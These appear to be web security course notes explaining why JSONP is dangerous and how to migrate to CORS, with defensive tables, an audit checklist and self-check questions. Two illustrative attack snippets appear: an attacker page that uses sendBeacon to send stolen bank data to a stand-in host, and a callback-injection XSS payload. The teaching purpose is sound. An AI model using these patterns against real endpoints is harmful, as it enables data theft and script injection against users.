web security course notes / JSONP

JSONP was a loophole with an API shape

JSONP was created because early web applications needed cross-origin data before CORS existed. Its trick was simple: move data through the one cross-origin channel the browser already allowed to execute - a script tag. That same trick is why JSONP remains dangerous: it is not data retrieval; it is remote code execution by design.

The rule of the whole topic

JSONP works only because cross-origin script inclusion is allowed. The server does not send JSON to be parsed. It sends JavaScript to be executed. If the endpoint carries cookies, reflects a callback, exposes private data, or can be loaded by an attacker, the security boundary has already moved from origin checks to trusting arbitrary script execution.

00

The problem JSONP solved

The Web originally had a strong asymmetry. Browsers could send many cross-origin requests by loading images, scripts, stylesheets, forms, frames, and other embedded resources. But scripts running in a page could not freely read cross-origin responses through APIs such as XMLHttpRequest. That read restriction is the security value of the Same-Origin Policy.

Same-Origin Policy is not "the browser cannot contact other sites." Browsers contact other sites constantly.

The better mental model is a mailroom. A page can mail a request to another building, and the browser may even bring back a box. The page is not automatically allowed to open the box and inspect its contents. JSONP worked by asking the other building to send back a performer who walks into your room and speaks the answer aloud as JavaScript.

Before standardized CORS deployment, a normal Ajax request from https://app.example to https://api.partner.test hit this wall:

  1. The page could create an XMLHttpRequest.
  2. The browser could send the network request.
  3. The browser would refuse to expose the response body to the calling script unless the response was same-origin or otherwise specially permitted.

But the page could always do this:

<script src="https://api.partner.test/news.js"></script>

That script would execute in the caller's page. JSONP took that old composition rule and made it look like a data API.

Defense-room phrasing

JSONP is not a relaxation of Same-Origin Policy in the same sense as CORS. It is a bypass pattern built from a resource type that Same-Origin Policy intentionally allowed to be embedded: cross-origin scripts.

01

The browser primitive it abused

The primitive is cross-site script inclusion. A page may include a script from another origin, and that script runs with the authority of the including page, not with an isolated data-only authority. It can call functions, read non-HttpOnly DOM state, modify the page, issue same-origin requests as the page, and exfiltrate values.

Data channel people wanted

  • Request remote JSON read
  • Parse response as data object
  • Handle success and failure control
  • Preserve code/data boundary safe

Channel JSONP actually used

  • Inject a script tag load
  • Execute remote response code
  • Hope it calls your function callback
  • Give remote server script execution danger

A browser does not parse a <script src> response as JSON. It parses it as a script resource. The classic JSONP response therefore had to be valid JavaScript:

// request
GET /profile?callback=receiveProfile HTTP/1.1
Host: api.example
Cookie: session=...

// response body
receiveProfile({"name":"Ada","plan":"research"});

The response is executable source text. The braces do not make it safe. The callback wrapper makes it deliberately executable.

Common mistake

Saying "JSONP returns JSON" is imprecise in a way that hides the vulnerability. JSONP returns JavaScript whose argument is usually a JSON-shaped value. That distinction is the whole security story.

02

The JSONP contract

A JSONP endpoint and a client agree on a callback parameter, commonly callback or jsonp. The client names a global function. The server wraps the payload in a call to that function. The browser loads the endpoint through a dynamically created script element.

Minimal JSONP client 
window.handleBalance = function (data) {
  renderBalance(data);
};

const s = document.createElement("script");
s.src = "https://bank.example/balance?callback=handleBalance";
document.head.appendChild(s);
Server response 
handleBalance({"account":"checking","balance":1234.56});

The contract has four implicit assumptions:

  1. The server trusts the callback string enough to place it into JavaScript source.
  2. The including page trusts the server enough to execute whatever it returns.
  3. The browser attaches ambient credentials, such as cookies, according to normal resource-loading rules.
  4. The response has no native browser-enforced notion of "this was data intended only for a particular origin."
The dangerous elegance

JSONP needed no new browser feature. It worked precisely because every moving part already existed: script loading, global functions, cookies, and JavaScript function calls.

03

Why it was useful in 2005

JSONP was not invented because people failed to understand security. It was invented because the web platform lacked a standardized, broadly deployed, data-only cross-origin read mechanism. Web applications were becoming richer, APIs were exposing JSON, and developers wanted mashups, widgets, search suggestions, maps, feeds, and partner integrations that ran in old browsers.

ConstraintJSONP answerSecurity cost
No broadly available CORSUse <script src>, which was already cross-originResponse executes as code
No preflight or server negotiationPlain GET requestOnly fits simple retrieval semantics
Old browsers and widgetsWorks with ancient DOM APIsGlobal callback namespace and race hazards
Need to embed partner dataServer wraps data in caller's function nameServer reflects attacker-influenced source text
CDN-friendly public feedsCacheable script responsePrivate and public data often got mixed by mistake

JSONP is the web equivalent of using a fire exit as the delivery entrance because the front door was locked and the building urgently needed supplies.

That may explain the practice. It does not make the fire exit a good permanent loading dock.

Historically fair, technically strict

For public, non-sensitive, read-only feeds in older browsers, JSONP was a practical compatibility hack. The mistake was treating that hack as a safe general-purpose API pattern.

04

Why it is dangerous

JSONP collapses the distinction between receiving data and executing code. Once a response is loaded as a script, the browser gives it the authority of the including page. That is the root cause. Every concrete JSONP vulnerability is a variation on it.

The security properties you lose

  • Response confidentiality by origin: any site can include the endpoint and observe the callback execution if the response contains secrets.
  • Data/code separation: the payload is not an inert JSON document; it is source code.
  • Method discipline: classic JSONP is GET-only, which encourages sensitive read operations to be exposed through bookmarkable URLs.
  • Content-type protection: even if a server says application/json, a script context historically made many systems think in terms of execution, sniffing, and plugin edge cases rather than data parsing.
  • Fine-grained origin authorization: the endpoint usually cannot tell which origin inserted the script in old deployments, and script tags are not governed by CORS response exposure rules.
  • Error handling: the caller often cannot distinguish network failure, syntax failure, malicious callback behavior, and honest empty data with the precision available to fetch.
The thesis sentence

JSONP is dangerous because it turns an authorization question - "may this origin read this data?" - into a code-execution question - "am I willing to run this remote origin's JavaScript inside my page?"

05

Attack class: data theft

The most important JSONP failure is exposing authenticated data. If a victim is logged in to bank.example, an attacker page can load https://bank.example/jsonp/balance?callback=steal. If the endpoint responds with the victim's cookie-authenticated data, the attacker receives it through the callback.

Attacker page 
function steal(data) {
  navigator.sendBeacon("https://attacker.test/collect",
    JSON.stringify(data));
}

const s = document.createElement("script");
s.src = "https://bank.example/api/balance?callback=steal";
document.head.appendChild(s);
Victim-authenticated response 
steal({
  "name": "Victim User",
  "last4": "1337",
  "balance": "$42,000"
});

This resembles CSRF in one sense: the attacker causes the victim's browser to send an authenticated cross-site request. It differs in the key security outcome: with JSONP, the attacker may also read the response, because the server voluntarily packaged the response as executable JavaScript that calls an attacker-controlled function.

Cookie nuance

Modern SameSite cookie defaults reduce some cross-site cookie attachment, but they do not make JSONP safe as a design. Older cookies, explicitly configured cookies, same-site-but-cross-origin subdomain cases, and non-cookie credentials can still matter. Treat SameSite as a mitigating layer, not as permission to keep sensitive JSONP endpoints.

06

Attack class: callback injection

The callback parameter is code-adjacent by construction. If the server validates it weakly, the attacker can break out of the intended function-call grammar and create reflected XSS or script gadget behavior.

Vulnerable server idea 
callback = request.query["callback"]
body = callback + "(" + json + ");"
Malicious request 
/feed?callback=alert(document.domain)//
Generated JavaScript 
alert(document.domain)//({"items":[]});

A strict JSONP callback is not "any string before an opening parenthesis." A defensive implementation historically had to limit it to a conservative JavaScript identifier path, for example foo or App.handlers.feed, with no brackets, quotes, operators, whitespace, comments, assignment, constructor access, Unicode confusion, or percent-decoding surprises.

Even strict validation is only a patch over the deeper issue: the endpoint still returns executable code. A perfect callback allowlist can prevent callback-string XSS while doing nothing to prevent authenticated data leakage.

Audit phrase

Callback validation is necessary if JSONP must exist, but it is not sufficient to make JSONP a safe carrier for sensitive data.

07

Attack class: trust confusion

JSONP creates two opposite trust problems at the same time. The consumer must trust the provider as a script supplier. The provider may accidentally trust every consumer as an authorized reader.

DirectionQuestionJSONP failure mode
Consumer trusting providerMay I run this remote server's JavaScript in my origin?A compromised or malicious provider can execute code in the consumer page.
Provider trusting consumerWhich origins may read this user's data?Any origin that can create a script tag can ask for the callback.
Browser enforcing boundaryIs this data exposed cross-origin?The browser sees a script load, not a data API read.
Security reviewIs this endpoint public or private?Teams often label it "just JSON" and miss that it is executable.

A JSONP endpoint used by a trusted first-party page is still globally includable unless additional application-level defenses exist. The browser does not remember that app.example was the intended caller.

The Referer header was sometimes used as an authorization signal, but it is not a clean security boundary. It can be absent due to policies and privacy tools, may be too coarse, and couples authorization to ambient request metadata rather than explicit protocol design.

The core design gap

CORS asks the data owner to name allowed origins in response headers. JSONP asks the data owner to execute whatever callback the requester names. Those are not equivalent security models.

08

JSON hijacking and legacy edges

JSONP sits in a family of problems where JSON-shaped data becomes executable or observable through script inclusion. Historically, some attacks targeted raw JSON arrays or JavaScript engine behavior rather than formal JSONP wrappers. These are often discussed as JSON hijacking or JavaScript hijacking.

The old lesson still matters even where the original browser behavior is gone: if a private response is directly executable as script, an attacker page may find a way to observe it, trigger it, or combine it with another browser feature. That is why secure JSON APIs should be served as JSON, with the correct media type, parsed by fetch or XHR under CORS rules, and not be valid standalone JavaScript intended for cross-origin script inclusion.

Legacy does not mean irrelevant

Many JSON hijacking variants depended on older browser behavior. The durable security lesson is not the exact exploit primitive; it is the rule that private API responses should not be designed to execute in an attacker-controlled page.

A modern lock may no longer be vulnerable to one famous picking technique. That does not justify storing the key under the mat. JSONP is the mat.

09

CORS changed the design space

CORS gives the server an explicit way to decide whether a browser should expose a cross-origin response to a requesting origin. That is the missing piece JSONP tried to fake through script execution.

JSONP

  • Transport: <script>
  • Response: JavaScript source
  • Credential handling: ambient and historically blunt
  • Error model: script load/syntax/callback confusion
  • Security primitive: code execution

CORS + JSON

  • Transport: fetch or XHR
  • Response: JSON document
  • Credential handling: explicit client and server choices
  • Error model: HTTP, network, parse, policy separation
  • Security primitive: response exposure control

A modern cross-origin JSON response should look conceptually like this:

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://app.example
Vary: Origin

{"items":["a","b"]}

And the client should treat it as data:

const res = await fetch("https://api.example/items", {
  credentials: "include"
});
const data = await res.json();
The CORS warning

CORS can be misconfigured. Access-Control-Allow-Origin: * on public data can be fine; reflecting arbitrary origins with credentials is not. But a flawed CORS policy is still a data-exposure policy mistake. JSONP begins by discarding the data/code boundary entirely.

10

Defensive decisions

The right defense depends on whether you own a legacy JSONP endpoint, consume third-party JSONP, or are designing a new API. The default decision should be removal or migration.

SituationPreferred decisionIf temporary compatibility is unavoidable
New APIDo not implement JSONPUse CORS, OAuth/token authorization, and JSON media types.
Public non-sensitive feedPrefer CORS JSON anywayKeep data strictly public, cacheable, GET-only, and documented as executable script.
Authenticated user dataRemove JSONPDo not rely on callback validation; migrate clients.
Callback parameter existsValidate strictly or removeAllow only conservative identifier paths; reject everything else.
Legacy consumersVersion and deprecateAdd telemetry, warnings, migration docs, and a shutdown date.
Consuming third-party JSONPAvoid in sensitive appsPut it in an isolated frame/domain or server-side proxy after review.

Minimum controls if you cannot remove it today

  • Serve no secrets, personal data, internal identifiers, CSRF tokens, or authorization-dependent content.
  • Require GET and make the operation read-only and side-effect free.
  • Use a strict callback allowlist grammar; never concatenate arbitrary callback strings.
  • Set X-Content-Type-Options: nosniff and an explicit script-oriented content type for actual JSONP, while serving real JSON only as application/json.
  • Do not mix JSON and JSONP on the same URL based only on the presence of a parameter unless the behavior is tightly tested and monitored.
  • Log usage by client, endpoint, callback name, and response class so you can remove it deliberately.
  • Do not treat Origin or Referer as a complete fix for JSONP data exposure.
CSP limitation

A strong script-src can protect a consuming application from loading unapproved JSONP providers. It cannot protect other sites from loading your vulnerable JSONP endpoint, and it cannot make an endpoint safe to expose private data.

11

Audit checklist

When reviewing a codebase or external surface, search for both server-side and client-side signals. JSONP often survives as a forgotten compatibility option.

Search server code and routes

  • callback parameter
  • jsonp parameter
  • application/javascript type
  • text/javascript type
  • res.jsonp framework
  • /**/ prefixing legacy

Search frontend code

  • dataType: "jsonp" jquery
  • jsonpCallback jquery
  • createElement("script") dynamic
  • ?callback= url
  • <script src="https://api static
  • global handler names callback

Questions that find the real risk

  1. Can the endpoint return user-specific, tenant-specific, admin-only, or non-public data?
  2. Are cookies, bearer tokens, API keys, client certificates, or session-bound state involved?
  3. Can an arbitrary external site include the endpoint as a script?
  4. Does the callback parameter accept anything besides a conservative identifier path?
  5. Does the response change behavior based on callback, format, output, or content negotiation?
  6. Are caches separating JSONP responses by callback and authorization state?
  7. Is there a migration path to CORS JSON, or is JSONP still part of the public contract?
Severity shortcut

Unauthenticated public weather data via JSONP is technical debt. Authenticated account data via JSONP is a confidentiality vulnerability. Callback injection that executes arbitrary script is XSS. A third-party JSONP provider loaded into a sensitive app is supply-chain script risk.

Self-check

Defense questions

In one sentence, why did JSONP come into existence?

Because early web applications needed cross-origin data reads before CORS was widely available, and cross-origin script inclusion was already permitted by browsers.

What is the single most important technical distinction between JSON and JSONP?

JSON is inert data that must be parsed; JSONP is JavaScript source that the browser executes, usually as a function call containing a JSON-shaped argument.

Why is callback validation not enough to protect authenticated JSONP?

Callback validation can prevent some reflected-script attacks, but it does not stop an attacker page from defining a valid callback name and receiving private data from a victim-authenticated response.

How is JSONP data theft similar to and different from CSRF?

Both abuse the victim browser's ability to send authenticated cross-site requests. CSRF usually focuses on causing an action; JSONP data theft focuses on reading a response that the server intentionally emits as executable callback code.

Why does CORS provide a better model?

CORS lets the resource owner decide which origins may read a response while preserving the response as data. JSONP uses script execution as the transfer mechanism, so the browser's data-exposure controls are bypassed by design.

When, if ever, is JSONP tolerable?

Only as a legacy compatibility mechanism for strictly public, non-sensitive, read-only data where the provider accepts that the response is executable script. For new systems, use CORS JSON instead.

Lab prompts

Use these as oral-defense drills. The point is not to memorize the code; it is to explain which security boundary failed.
